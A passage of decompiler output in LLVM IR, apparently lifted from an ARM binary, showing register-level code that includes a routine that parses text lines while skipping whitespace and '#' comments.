  %v1_12d9c = call i32 @function_ca18(i32 %v3_12a7c)
  %v3_12da0 = load i32, i32* %stack_var_0, align 4
  %v2_12da4 = icmp eq i32 %v3_12da0, 0
  br i1 %v2_12da4, label %.thread26, label %bb206

bb206:                                            ; preds = %dec_label_pc_12d98
  %v1_12dac = load i32, i32* @r7, align 4
  %v3_12da8 = inttoptr i32 %v3_12da0 to i32*
  store i32 %v1_12dac, i32* %v3_12da8, align 4
  br label %bb207

.thread26:                                        ; preds = %dec_label_pc_12d98
  br label %bb207

bb207:                                            ; preds = %bb206, %.thread26
  store i32 77236, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_12da4, i32 ptrtoint (i32* @global_var_fa5c.278 to i32))
  %v2_12db4 = load i32, i32* %stack_var_-236, align 4
  store i32 %v2_12848, i32* @r4, align 4
  %v1_12dbc = call i32 @function_fa5c(i32 %v2_12db4)
  store i32 %v2_12848, i32* @r0, align 4
  %v1_12dd4 = call i32 @function_10840()
  %v1_12de4 = call i32 @function_10838()
  %v0_12df0 = load i32, i32* @r6, align 4
  %v3_12df0 = sdiv i32 %v0_12df0, 256
  %v0_12df4 = load i32, i32* @sl, align 4
  store i32 %v0_12df4, i32* @global_var_1aae8.553, align 4
  store i32 %v2_12848, i32* @r0, align 4
  %v1_12e00 = trunc i32 %v3_12df0 to i8
  store i8 %v1_12e00, i8* @global_var_18435.556, align 1
  %v1_12e04 = trunc i32 %v0_12df0 to i8
  store i8 %v1_12e04, i8* bitcast (i8** @global_var_18434.555 to i8*), align 4
  store i32 ptrtoint (i32* @global_var_12e14.567 to i32), i32* @lr, align 4
  %v1_12e10 = call i32 @function_10840()
  %v0_12f9c.pre = load i32, i32* @fp, align 4
  br label %dec_label_pc_12f9c

dec_label_pc_12e18:                               ; preds = %dec_label_pc_12aac, %dec_label_pc_12acc
  %v0_12e18 = load i32, i32* @sl, align 4
  %v1_12e18 = add i32 %v0_12e18, 1
  %v2_12e20 = call i32 @function_c930(i32 %v1_12e18, i32 %arg3)
  store i32 %v2_12e20, i32* @sl, align 4
  %v2_12e24 = icmp eq i32 %v2_12e20, 0
  br i1 %v2_12e24, label %dec_label_pc_12e2c, label %dec_label_pc_12ee4.backedge

dec_label_pc_12e2c:                               ; preds = %dec_label_pc_12e18
  %v1_12e34 = add i32 %stack_var_-208.567, 1
  br label %dec_label_pc_12ee8.outer.backedge

dec_label_pc_12ee8.outer.backedge:                ; preds = %dec_label_pc_12e2c, %dec_label_pc_12ec8, %.thread19
  %stack_var_-204.1.ph.be = phi i32 [ %v7_12bc0, %.thread19 ], [ -1, %dec_label_pc_12ec8 ], [ -1, %dec_label_pc_12e2c ]
  %stack_var_-208.5.ph.be = phi i32 [ %stack_var_-208.567, %.thread19 ], [ %v1_12ed0, %dec_label_pc_12ec8 ], [ %v1_12e34, %dec_label_pc_12e2c ]
  %tmp295 = icmp ult i32 %stack_var_-208.5.ph.be, 3
  br i1 %tmp295, label %dec_label_pc_128cc.lr.ph, label %dec_label_pc_12f04

dec_label_pc_12e44:                               ; preds = %dec_label_pc_12d3c
  %v1_12e44 = inttoptr i32 %v0_12d3c to i32*
  %v2_12e44 = load i32, i32* %v1_12e44, align 4
  %v1_12e48 = call i32 @function_fa5c(i32 %v2_12e44)
  br label %dec_label_pc_12e4c

dec_label_pc_12e4c:                               ; preds = %dec_label_pc_12bdc, %dec_label_pc_12b30, %dec_label_pc_12c6c, %dec_label_pc_12c60, %dec_label_pc_12b48, %dec_label_pc_12b10, %dec_label_pc_12e44
  br i1 %v2_12e50, label %dec_label_pc_12e58, label %dec_label_pc_12eb4

dec_label_pc_12e58:                               ; preds = %dec_label_pc_12e4c
  store i32 %v2_12848, i32* @r5, align 4
  store i32 %v2_12848, i32* @r0, align 4
  %v1_12e70 = call i32 @function_10840()
  %v1_12e80 = call i32 @function_10838()
  %v2_12e8c = load i32, i32* @global_var_1ad48.561, align 4
  store i32 %v2_12848, i32* @r0, align 4
  store i32 77472, i32* @lr, align 4
  %v1_12e9c = call i32 @function_10840()
  %v1_12ea4 = add i32 %v2_12e8c, -1
  store i32 %v1_12ea4, i32* @r4, align 4
  %v5_12eac = icmp slt i32 %v6_12eac, %v1_12ea4
  br i1 %v5_12eac, label %.thread27, label %dec_label_pc_12eb4

.thread27:                                        ; preds = %dec_label_pc_12e58
  %v7_12eac = add i32 %v6_12eac, 1
  br label %dec_label_pc_12ee4.backedge

dec_label_pc_12eb4:                               ; preds = %dec_label_pc_12e58, %dec_label_pc_12e4c
  %v0_12eb4 = load i32, i32* @sl, align 4
  %v1_12eb4 = add i32 %v0_12eb4, 1
  %v2_12ebc = call i32 @function_c930(i32 %v1_12eb4, i32 %arg3)
  store i32 %v2_12ebc, i32* @sl, align 4
  %v2_12ec0 = icmp eq i32 %v2_12ebc, 0
  br i1 %v2_12ec0, label %dec_label_pc_12ec8, label %dec_label_pc_12ee4.backedge

dec_label_pc_12ec8:                               ; preds = %dec_label_pc_12eb4
  %v1_12ed0 = add i32 %stack_var_-208.567, 1
  br label %dec_label_pc_12ee8.outer.backedge

dec_label_pc_12ee4.backedge:                      ; preds = %dec_label_pc_12e18, %dec_label_pc_12eb4, %.thread27
  %storemerge87 = phi i32 [ %v7_12eac, %.thread27 ], [ -1, %dec_label_pc_12eb4 ], [ -1, %dec_label_pc_12e18 ]
  %tmp296 = icmp ult i32 %stack_var_-208.567, 3
  br i1 %tmp296, label %dec_label_pc_128cc.lr.ph.preheader, label %dec_label_pc_12f04

dec_label_pc_128cc.lr.ph.preheader:               ; preds = %dec_label_pc_128cc.lr.ph.preheader.lr.ph, %dec_label_pc_12ee4.backedge
  %stack_var_-216.0261 = phi i32 [ -1, %dec_label_pc_128cc.lr.ph.preheader.lr.ph ], [ %v3_12a7c, %dec_label_pc_12ee4.backedge ]
  %stack_var_-208.4260 = phi i32 [ %v0_128c4, %dec_label_pc_128cc.lr.ph.preheader.lr.ph ], [ %stack_var_-208.567, %dec_label_pc_12ee4.backedge ]
  %v0_12ee4259 = phi i32 [ -1, %dec_label_pc_128cc.lr.ph.preheader.lr.ph ], [ %storemerge87, %dec_label_pc_12ee4.backedge ]
  br label %dec_label_pc_128cc.lr.ph

dec_label_pc_128cc.lr.ph:                         ; preds = %dec_label_pc_128cc.lr.ph.preheader, %dec_label_pc_12ee8.outer.backedge
  %stack_var_-216.1.ph84 = phi i32 [ %v3_12a7c, %dec_label_pc_12ee8.outer.backedge ], [ %stack_var_-216.0261, %dec_label_pc_128cc.lr.ph.preheader ]
  %stack_var_-208.5.ph83 = phi i32 [ %stack_var_-208.5.ph.be, %dec_label_pc_12ee8.outer.backedge ], [ %stack_var_-208.4260, %dec_label_pc_128cc.lr.ph.preheader ]
  %v6_12eac = phi i32 [ %stack_var_-204.1.ph.be, %dec_label_pc_12ee8.outer.backedge ], [ %v0_12ee4259, %dec_label_pc_128cc.lr.ph.preheader ]
  %v1_12974 = icmp slt i32 %v6_12eac, 0
  %v4_129b0 = mul i32 %v6_12eac, 4
  %v5_129b0 = add i32 %v4_129b0, ptrtoint (i32* @global_var_1ad28.565 to i32)
  %v6_129b0 = inttoptr i32 %v5_129b0 to i32*
  br label %dec_label_pc_128cc

dec_label_pc_12ef8:                               ; preds = %bb195, %.thread8, %dec_label_pc_12824, %dec_label_pc_12818
  store i32 -1, i32* @sl, align 4
  store i32 -1, i32* @sb, align 4
  br label %dec_label_pc_12f04

dec_label_pc_12f04:                               ; preds = %dec_label_pc_12834, %dec_label_pc_12ee4.backedge, %dec_label_pc_12ee8.outer.backedge, %bb200, %dec_label_pc_129bc, %dec_label_pc_12ee8.backedge, %dec_label_pc_12ef8
  %stack_var_-216.2 = phi i32 [ -1, %dec_label_pc_12ef8 ], [ %v3_12a7c, %dec_label_pc_12ee8.backedge ], [ %v1_128d4, %dec_label_pc_129bc ], [ %v1_128d4, %bb200 ], [ %v3_12a7c, %dec_label_pc_12ee8.outer.backedge ], [ -1, %dec_label_pc_12834 ], [ %v3_12a7c, %dec_label_pc_12ee4.backedge ]
  %v0_12f04 = call i32 @function_11004()
  %v2_12f0c = inttoptr i32 %v0_12f04 to i32*
  store i32 -1, i32* %v2_12f0c, align 4
  %v0_12f10 = load i32, i32* @sb, align 4
  store i32 %v0_12f10, i32* @r6, align 4
  br label %dec_label_pc_12f14

dec_label_pc_12f14:                               ; preds = %dec_label_pc_12c00, %dec_label_pc_12f04
  %v1_12f1c = phi i32 [ %stack_var_-216.2, %dec_label_pc_12f04 ], [ %v3_12a7c, %dec_label_pc_12c00 ]
  %v7_12f18 = icmp eq i32 %v1_12f1c, -1
  br i1 %v7_12f18, label %bb209, label %bb208

bb208:                                            ; preds = %dec_label_pc_12f14
  br label %bb209

bb209:                                            ; preds = %dec_label_pc_12f14, %bb208
  store i32 77604, i32* @lr, align 4
  %v1_12f20 = xor i1 %v7_12f18, true
  call void @__pseudo_cond_branch(i1 %v1_12f20, i32 ptrtoint (i32* @global_var_ca18.558 to i32))
  %v2_12f24 = load i32, i32* %stack_var_-236, align 4
  %v1_12f28 = call i32 @function_fa5c(i32 %v2_12f24)
  %v0_12f2c = load i32, i32* @r7, align 4
  %v1_12f30 = call i32 @function_fa5c(i32 %v0_12f2c)
  %v0_12f34 = load i32, i32* @sl, align 4
  %v7_12f34 = icmp eq i32 %v0_12f34, -1
  br i1 %v7_12f34, label %bb210, label %dec_label_pc_12f40

bb210:                                            ; preds = %bb209
  br label %dec_label_pc_12f9c

dec_label_pc_12f40:                               ; preds = %bb209
  %v2_12f40 = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_12f40, i32* @r0, align 4
  %v1_12f58 = call i32 @function_10840()
  %v1_12f68 = call i32 @function_10838()
  %v0_12f74 = load i32, i32* @r6, align 4
  %v3_12f74 = sdiv i32 %v0_12f74, 256
  %v0_12f78 = load i32, i32* @sl, align 4
  store i32 %v0_12f78, i32* @global_var_1aae8.553, align 4
  store i32 %v2_12f40, i32* @r0, align 4
  %v1_12f84 = trunc i32 %v3_12f74 to i8
  store i8 %v1_12f84, i8* @global_var_18435.556, align 1
  %v1_12f88 = trunc i32 %v0_12f74 to i8
  store i8 %v1_12f88, i8* bitcast (i8** @global_var_18434.555 to i8*), align 4
  store i32 77720, i32* @lr, align 4
  %v1_12f94 = call i32 @function_10840()
  br label %dec_label_pc_12f9c

dec_label_pc_12f9c:                               ; preds = %bb210, %bb207, %dec_label_pc_12f40
  %v0_12f9c = phi i32 [ %v0_12f34, %bb210 ], [ %v0_12f9c.pre, %bb207 ], [ -1, %dec_label_pc_12f40 ]
  store i32 %v3_127d0, i32* @r4, align 4
  store i32 %v6_127d0, i32* @r5, align 4
  store i32 %v9_127d0, i32* @r6, align 4
  store i32 %v12_127d0, i32* @r7, align 4
  store i32 %v15_127d0, i32* @r8, align 4
  store i32 %v18_127d0, i32* @sb, align 4
  store i32 %v21_127d0, i32* @sl, align 4
  ret i32 %v0_12f9c

; uselistorder directives
  uselistorder i32 %v0_12f74, { 1, 0 }
  uselistorder i32 %v0_12f34, { 1, 0 }
  uselistorder i1 %v7_12f18, { 1, 0 }
  uselistorder i32 %v6_12eac, { 2, 6, 3, 4, 1, 5, 0 }
  uselistorder i32 %stack_var_-208.5.ph.be, { 1, 0 }
  uselistorder i32 %v0_12df0, { 1, 0 }
  uselistorder i32 %stack_var_-192.0, { 6, 1, 2, 5, 0, 3, 4 }
  uselistorder i32 %stack_var_-212.2, { 1, 0 }
  uselistorder i32 %v0_12c44, { 0, 1, 3, 2 }
  uselistorder i32 %v0_12d3c, { 0, 2, 1, 3 }
  uselistorder i32 %v1_12cfc, { 1, 0 }
  uselistorder i32 %v0_12c1c, { 1, 0 }
  uselistorder i32 %v0_12c20, { 1, 0 }
  uselistorder i32 %v5_12b20, { 1, 0 }
  uselistorder i32 %v3_12a7c, { 5, 0, 1, 2, 3, 4, 6, 8, 7, 10, 9, 12, 13, 11 }
  uselistorder i32 %v1_129e8, { 1, 0 }
  uselistorder i32 %v2_12988, { 1, 0 }
  uselistorder i32 %v1_12900, { 1, 2, 0 }
  uselistorder i1 %v7_128d0, { 1, 0 }
  uselistorder i32 %stack_var_-208.567, { 2, 1, 4, 5, 3, 0 }
  uselistorder i32 %v1_128d4, { 1, 2, 0 }
  uselistorder i32 %v0_128c4, { 1, 0 }
  uselistorder i32 %v2_12848, { 6, 7, 8, 0, 1, 2, 3, 4, 5, 9, 10, 11, 12, 13 }
  uselistorder i32* %stack_var_-236, { 1, 2, 3, 4, 5, 0, 6 }
  uselistorder i8* %stack_var_-188, { 4, 3, 1, 0, 2 }
  uselistorder i8* %stack_var_-100, { 0, 4, 1, 3, 2 }
  uselistorder i32* %stack_var_-44, { 1, 0 }
  uselistorder i32* %stack_var_-140, { 1, 0, 2 }
  uselistorder i32* %stack_var_0, { 1, 0 }
  uselistorder i32 %tmp155, { 2, 0, 4, 1, 3 }
  uselistorder i32 %tmp146, { 1, 0, 2 }
  uselistorder i32 %tmp, { 3, 2, 0, 1 }
  uselistorder i32 (i32)* @function_ca18, { 4, 11, 10, 9, 8, 7, 6, 0, 13, 12, 5, 3, 2, 1 }
  uselistorder i32 101, { 4, 1, 2, 3, 0, 5 }
  uselistorder i32 (i32, %sockaddr*, i32)* @function_f7f4, { 1, 0, 2 }
  uselistorder i32 (i32, i32, i32)* @function_f8dc, { 2, 6, 5, 4, 3, 1, 0 }
  uselistorder i32 17, { 1, 10, 3, 6, 4, 7, 5, 8, 2, 9, 12, 11, 0 }
  uselistorder i32 (i32)* @function_f3c0, { 1, 6, 5, 4, 3, 2, 0 }
  uselistorder i32 (i32, i32, i32)* @function_ee60, { 2, 1, 0, 3 }
  uselistorder i8* @global_var_18435.556, { 2, 1, 0 }
  uselistorder i32 (i32, i32)* @function_c930, { 6, 5, 4, 3, 7, 8, 2, 1, 0 }
  uselistorder i32 (i32)* @function_f908, { 3, 6, 7, 2, 0, 8, 5, 1, 4 }
  uselistorder i32 512, { 3, 4, 1, 5, 2, 6, 7, 8, 9, 0 }
  uselistorder i32 %arg2, { 2, 4, 5, 0, 1, 3 }
  uselistorder label %dec_label_pc_12f9c, { 2, 0, 1 }
  uselistorder label %bb209, { 1, 0 }
  uselistorder label %dec_label_pc_12f14, { 1, 0 }
  uselistorder label %dec_label_pc_12f04, { 6, 1, 2, 5, 4, 3, 0 }
  uselistorder label %dec_label_pc_12ef8, { 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_128cc.lr.ph.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_12ee4.backedge, { 1, 2, 0 }
  uselistorder label %dec_label_pc_12e4c, { 6, 2, 3, 0, 4, 1, 5 }
  uselistorder label %dec_label_pc_12ee8.outer.backedge, { 1, 0, 2 }
  uselistorder label %dec_label_pc_12e18, { 1, 0 }
  uselistorder label %bb207, { 1, 0 }
  uselistorder label %dec_label_pc_12d98, { 4, 2, 1, 3, 0 }
  uselistorder label %bb205, { 1, 0 }
  uselistorder label %dec_label_pc_12d84, { 1, 0 }
  uselistorder label %dec_label_pc_12d70, { 2, 0, 1 }
  uselistorder label %dec_label_pc_12d6c, { 1, 0 }
  uselistorder label %dec_label_pc_12cd4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_12c10, { 1, 0 }
  uselistorder label %dec_label_pc_12c00, { 1, 0 }
  uselistorder label %dec_label_pc_12ee8.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_12a68, { 1, 0 }
  uselistorder label %.thread11, { 1, 0 }
  uselistorder label %dec_label_pc_129bc, { 2, 0, 1 }
  uselistorder label %bb200, { 1, 0 }
}

define i32 @function_12fa8(i32 %arg1, i64* %arg2) local_unnamed_addr {
dec_label_pc_12fa8:
  %v0_12fa8 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_12fa8, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_12fa8
  %tmp = ptrtoint i64* %arg2 to i32
  %v6_12fa8 = mul i32 %tmp, 256
  %v7_12fa8 = and i32 %v6_12fa8, %arg1
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_12fa8, %bb
  %v10_12fd8 = phi i32 [ %arg1, %dec_label_pc_12fa8 ], [ %v7_12fa8, %bb ]
  ret i32 %v10_12fd8

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @function_12fdc(i32 %arg1) local_unnamed_addr {
dec_label_pc_12fdc:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-192 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v3_12fdc = load i32, i32* @r4, align 4
  store i32 %v3_12fdc, i32* %stack_var_-28, align 4
  %v6_12fdc = load i32, i32* @r5, align 4
  %v9_12fdc = load i32, i32* @r6, align 4
  %v12_12fdc = load i32, i32* @r7, align 4
  %v15_12fdc = load i32, i32* @r8, align 4
  %v18_12fdc = load i32, i32* @sl, align 4
  %v2_12fe0 = ptrtoint i32* %stack_var_-192 to i32
  %v2_12fe4 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_12fe4, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_18438.413 to i32), i32* %r2.global-to-local, align 4
  %v1_12ff8 = call i32 @function_10840()
  store i32 ptrtoint (i32* @global_var_18438.413 to i32), i32* %r0.global-to-local, align 4
  store i32 77836, i32* @lr, align 4
  %v1_13008 = call i32 @function_10838()
  store i32 %v1_13008, i32* %r0.global-to-local, align 4
  %v2_13010 = load i32, i32* @global_var_1ad44.418, align 4
  %v5_13018 = icmp sgt i32 %v2_13010, 0
  br i1 %v5_13018, label %dec_label_pc_13254, label %dec_label_pc_1301c

dec_label_pc_1301c:                               ; preds = %dec_label_pc_12fdc
  store i32 ptrtoint ([17 x i8]* @global_var_17c14.574 to i32), i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_17c28.576 to i32), i32* @r1, align 4
  %v3_13024 = call i32 @function_cd94(i32 ptrtoint ([17 x i8]* @global_var_17c14.574 to i32), i32 ptrtoint (i32* @global_var_17c28.576 to i32))
  store i32 %v3_13024, i32* %r0.global-to-local, align 4
  store i32 %v3_13024, i32* @sl, align 4
  %v2_13028 = icmp eq i32 %v3_13024, 0
  br i1 %v2_13028, label %dec_label_pc_13030, label %dec_label_pc_1321c.preheader

dec_label_pc_13030:                               ; preds = %dec_label_pc_1301c
  store i32 ptrtoint ([24 x i8]* @global_var_17c2c.578 to i32), i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_17c28.576 to i32), i32* @r1, align 4
  %v3_13038 = call i32 @function_cd94(i32 ptrtoint ([24 x i8]* @global_var_17c2c.578 to i32), i32 ptrtoint (i32* @global_var_17c28.576 to i32))
  store i32 %v3_13038, i32* %r0.global-to-local, align 4
  store i32 %v3_13038, i32* @sl, align 4
  %v2_1303c = icmp eq i32 %v3_13038, 0
  br i1 %v2_1303c, label %dec_label_pc_13248, label %dec_label_pc_1321c.preheader

dec_label_pc_1321c.preheader:                     ; preds = %dec_label_pc_1301c, %dec_label_pc_13030
  %v0_1322426 = phi i32 [ %v3_13024, %dec_label_pc_1301c ], [ %v3_13038, %dec_label_pc_13030 ]
  %v2_13090 = ptrtoint i32* %stack_var_-28 to i32
  %v3_1312c = inttoptr i32 %tmp to i8*
  store i32 %v2_12fe0, i32* %r0.global-to-local, align 4
  store i32 %v0_1322426, i32* %r2.global-to-local, align 4
  %v3_1322866 = call i32 @function_e500(i32 %v2_12fe0, i32 128, i32 %v0_1322426)
  store i32 %v3_1322866, i32* %r0.global-to-local, align 4
  %v2_1322c68 = icmp eq i32 %v3_1322866, 0
  store i32 %v2_12fe0, i32* @r4, align 4
  br i1 %v2_1322c68, label %dec_label_pc_1323c, label %dec_label_pc_1304c.preheader.lr.ph

dec_label_pc_1304c.preheader.lr.ph:               ; preds = %dec_label_pc_1321c.preheader
  %v1_1304c11 = bitcast i32* %stack_var_-192 to i8*
  br label %dec_label_pc_1304c.preheader

dec_label_pc_13048:                               ; preds = %dec_label_pc_13058
  %v1_13048 = add i32 %v0_13048, 1
  store i32 %v1_13048, i32* %r0.global-to-local, align 4
  %v1_1304c = inttoptr i32 %v1_13048 to i8*
  %v2_1304c = load i8, i8* %v1_1304c, align 1
  %v3_1304c = zext i8 %v2_1304c to i32
  store i32 %v3_1304c, i32* %r2.global-to-local, align 4
  %v2_13050 = icmp eq i8 %v2_1304c, 0
  br i1 %v2_13050, label %dec_label_pc_1306c, label %dec_label_pc_13058

dec_label_pc_13058:                               ; preds = %dec_label_pc_13058.lr.ph, %dec_label_pc_13048
  %v0_13048 = phi i32 [ %v2_12fe0, %dec_label_pc_13058.lr.ph ], [ %v1_13048, %dec_label_pc_13048 ]
  %v1_13060 = phi i32 [ %v3_1304c13, %dec_label_pc_13058.lr.ph ], [ %v3_1304c, %dec_label_pc_13048 ]
  %v3_13060 = mul nuw nsw i32 %v1_13060, 2
  %v4_13060 = add i32 %v3_13060, %v2_1305c.pre
  %v5_13060 = inttoptr i32 %v4_13060 to i8*
  %v6_13060 = load i8, i8* %v5_13060, align 1
  %v1_13064 = and i8 %v6_13060, 32
  %v2_13064 = icmp eq i8 %v1_13064, 0
  br i1 %v2_13064, label %dec_label_pc_1306c, label %dec_label_pc_13048

dec_label_pc_1306c:                               ; preds = %dec_label_pc_13048, %dec_label_pc_13058, %dec_label_pc_1304c.preheader
  %v0_1310435 = phi i32 [ %v2_12fe0, %dec_label_pc_1304c.preheader ], [ %v1_13048, %dec_label_pc_13048 ], [ %v0_13048, %dec_label_pc_13058 ]
  %v0_13080 = phi i32 [ %v3_1304c13, %dec_label_pc_1304c.preheader ], [ %v3_1304c, %dec_label_pc_13048 ], [ %v1_13060, %dec_label_pc_13058 ]
  %v7_1306c = icmp eq i32 %v0_13080, 10
  br i1 %v7_1306c, label %.thread3, label %bb

bb:                                               ; preds = %dec_label_pc_1306c
  %v3_13070 = icmp eq i32 %v0_13080, 0
  br i1 %v3_13070, label %bb55, label %dec_label_pc_13080

.thread3:                                         ; preds = %dec_label_pc_1306c
  br label %dec_label_pc_1321c.backedge

bb55:                                             ; preds = %bb
  br label %dec_label_pc_1321c.backedge

dec_label_pc_1321c.backedge:                      ; preds = %dec_label_pc_131f8, %dec_label_pc_13210, %bb55, %dec_label_pc_13190, %.thread3, %dec_label_pc_13080
  %v0_13224.pre = load i32, i32* @sl, align 4
  store i32 %v2_12fe0, i32* %r0.global-to-local, align 4
  store i32 %v0_13224.pre, i32* %r2.global-to-local, align 4
  %v3_13228 = call i32 @function_e500(i32 %v2_12fe0, i32 128, i32 %v0_13224.pre)
  store i32 %v3_13228, i32* %r0.global-to-local, align 4
  %v2_1322c = icmp eq i32 %v3_13228, 0
  store i32 %v2_12fe0, i32* @r4, align 4
  br i1 %v2_1322c, label %dec_label_pc_1323c, label %dec_label_pc_1304c.preheader

dec_label_pc_13080:                               ; preds = %bb
  %v7_13080 = icmp eq i32 %v0_13080, 35
  br i1 %v7_13080, label %dec_label_pc_1321c.backedge, label %dec_label_pc_13104

dec_label_pc_13090:                               ; preds = %bb58
  store i32 %v2_13090, i32* %r2.global-to-local, align 4
  %v4_13094 = mul i32 %storemerge, 4
  %v5_13094 = add i32 %v4_13094, %v2_13090
  %v2_13098 = add i32 %v5_13094, -36
  %v3_13098 = inttoptr i32 %v2_13098 to i32*
  store i32 %v0_13098, i32* %v3_13098, align 4
  %v0_130a415 = load i32, i32* %r0.global-to-local, align 4
  %v1_130a416 = inttoptr i32 %v0_130a415 to i8*
  %v2_130a417 = load i8, i8* %v1_130a416, align 1
  %v3_130a418 = zext i8 %v2_130a417 to i32
  store i32 %v3_130a418, i32* %r2.global-to-local, align 4
  %v2_130a819 = icmp eq i8 %v2_130a417, 0
  br i1 %v2_130a819, label %dec_label_pc_130d8.preheader, label %dec_label_pc_130b0.lr.ph

dec_label_pc_130b0.lr.ph:                         ; preds = %dec_label_pc_13090
  %v2_130b4.pre = load i32, i32* @global_var_18428, align 4
  br label %dec_label_pc_130b0

dec_label_pc_130a0:                               ; preds = %dec_label_pc_130c4
  %v1_130a0 = add i32 %v0_130a0, 1
  store i32 %v1_130a0, i32* %r0.global-to-local, align 4
  %v1_130a4 = inttoptr i32 %v1_130a0 to i8*
  %v2_130a4 = load i8, i8* %v1_130a4, align 1
  %v3_130a4 = zext i8 %v2_130a4 to i32
  store i32 %v3_130a4, i32* %r2.global-to-local, align 4
  %v2_130a8 = icmp eq i8 %v2_130a4, 0
  br i1 %v2_130a8, label %dec_label_pc_130d8.preheader, label %dec_label_pc_130b0

dec_label_pc_130b0:                               ; preds = %dec_label_pc_130b0.lr.ph, %dec_label_pc_130a0
  %v0_130a0 = phi i32 [ %v0_130a415, %dec_label_pc_130b0.lr.ph ], [ %v1_130a0, %dec_label_pc_130a0 ]
  %v0_130c4 = phi i32 [ %v3_130a418, %dec_label_pc_130b0.lr.ph ], [ %v3_130a4, %dec_label_pc_130a0 ]
  %v3_130b8 = mul nuw nsw i32 %v0_130c4, 2
  %v4_130b8 = add i32 %v3_130b8, %v2_130b4.pre
  %v5_130b8 = inttoptr i32 %v4_130b8 to i8*
  %v6_130b8 = load i8, i8* %v5_130b8, align 1
  %v1_130bc = and i8 %v6_130b8, 32
  %v2_130bc = icmp eq i8 %v1_130bc, 0
  br i1 %v2_130bc, label %dec_label_pc_130c4, label %dec_label_pc_130d8.preheader

dec_label_pc_130c4:                               ; preds = %dec_label_pc_130b0
  %v7_130c4 = icmp eq i32 %v0_130c4, 10
  br i1 %v7_130c4, label %dec_label_pc_130d8.preheader, label %dec_label_pc_130a0

dec_label_pc_130d8.preheader:                     ; preds = %dec_label_pc_130c4, %dec_label_pc_130b0, %dec_label_pc_130a0, %dec_label_pc_13090
  %v0_130d820 = phi i32 [ %v0_130a415, %dec_label_pc_13090 ], [ %v0_130a0, %dec_label_pc_130c4 ], [ %v0_130a0, %dec_label_pc_130b0 ], [ %v1_130a0, %dec_label_pc_130a0 ]
  %v1_130d821 = inttoptr i32 %v0_130d820 to i8*
  %v2_130d822 = load i8, i8* %v1_130d821, align 1
  %v3_130d823 = zext i8 %v2_130d822 to i32
  store i32 %v3_130d823, i32* %r2.global-to-local, align 4
  %v2_130dc24 = icmp eq i8 %v2_130d822, 0
  br i1 %v2_130dc24, label %dec_label_pc_13100, label %dec_label_pc_130e4

dec_label_pc_130d0:                               ; preds = %dec_label_pc_130e4, %dec_label_pc_130f8
  %v3_130d4 = inttoptr i32 %v2_130d4 to i8*
  store i8 0, i8* %v3_130d4, align 1
  %v4_130d4 = load i32, i32* %r0.global-to-local, align 4
  %v5_130d4 = add i32 %v4_130d4, 1
  store i32 %v5_130d4, i32* %r0.global-to-local, align 4
  %v1_130d8 = inttoptr i32 %v5_130d4 to i8*
  %v2_130d8 = load i8, i8* %v1_130d8, align 1
  %v3_130d8 = zext i8 %v2_130d8 to i32
  store i32 %v3_130d8, i32* %r2.global-to-local, align 4
  %v2_130dc = icmp eq i8 %v2_130d8, 0
  br i1 %v2_130dc, label %dec_label_pc_13100, label %dec_label_pc_130e4

dec_label_pc_130e4:                               ; preds = %dec_label_pc_130d8.preheader, %dec_label_pc_130d0
  %v0_130f8 = phi i32 [ %v3_130d8, %dec_label_pc_130d0 ], [ %v3_130d823, %dec_label_pc_130d8.preheader ]
  %v2_130d4 = phi i32 [ %v5_130d4, %dec_label_pc_130d0 ], [ %v0_130d820, %dec_label_pc_130d8.preheader ]
  %v2_130e8 = load i32, i32* @global_var_18428, align 4
  %v3_130ec = mul nuw nsw i32 %v0_130f8, 2
  %v4_130ec = add i32 %v2_130e8, %v3_130ec
  %v5_130ec = inttoptr i32 %v4_130ec to i8*
  %v6_130ec = load i8, i8* %v5_130ec, align 1
  %v1_130f0 = and i8 %v6_130ec, 32
  %v2_130f0 = icmp eq i8 %v1_130f0, 0
  br i1 %v2_130f0, label %dec_label_pc_130f8, label %dec_label_pc_130d0

dec_label_pc_130f8:                               ; preds = %dec_label_pc_130e4
  %v7_130f8 = icmp eq i32 %v0_130f8, 10
  br i1 %v7_130f8, label %dec_label_pc_130d0, label %dec_label_pc_13100

dec_label_pc_13100:                               ; preds = %dec_label_pc_130d0, %dec_label_pc_130f8, %dec_label_pc_130d8.preheader
  %v0_1310434 = phi i32 [ %v0_130d820, %dec_label_pc_130d8.preheader ], [ %v5_130d4, %dec_label_pc_130d0 ], [ %v2_130d4, %dec_label_pc_130f8 ]
  %v0_13100 = load i32, i32* @r8, align 4
  %v1_13100 = add i32 %v0_13100, 1
  br label %dec_label_pc_13104

dec_label_pc_13104:                               ; preds = %dec_label_pc_13080, %dec_label_pc_13100
  %storemerge = phi i32 [ %v1_13100, %dec_label_pc_13100 ], [ 0, %dec_label_pc_13080 ]
  %v0_13098 = phi i32 [ %v0_1310434, %dec_label_pc_13100 ], [ %v0_1310435, %dec_label_pc_13080 ]
  store i32 %storemerge, i32* @r8, align 4
  %v1_13104 = inttoptr i32 %v0_13098 to i8*
  %v2_13104 = load i8, i8* %v1_13104, align 1
  %v3_13104 = zext i8 %v2_13104 to i32
  %v2_13108 = icmp eq i8 %v2_13104, 0
  br i1 %v2_13108, label %bb57, label %bb56

bb56:                                             ; preds = %dec_label_pc_13104
  br label %bb57

bb57:                                             ; preds = %dec_label_pc_13104, %bb56
  %v0_13118.pr = phi i32 [ %v3_13104, %dec_label_pc_13104 ], [ 1, %bb56 ]
  %v1_13110 = add i32 %storemerge, -4
  %v3_13110 = sub i32 3, %storemerge
  %v4_13110 = and i32 %v3_13110, %storemerge
  %v5_13110 = icmp slt i32 %v4_13110, 0
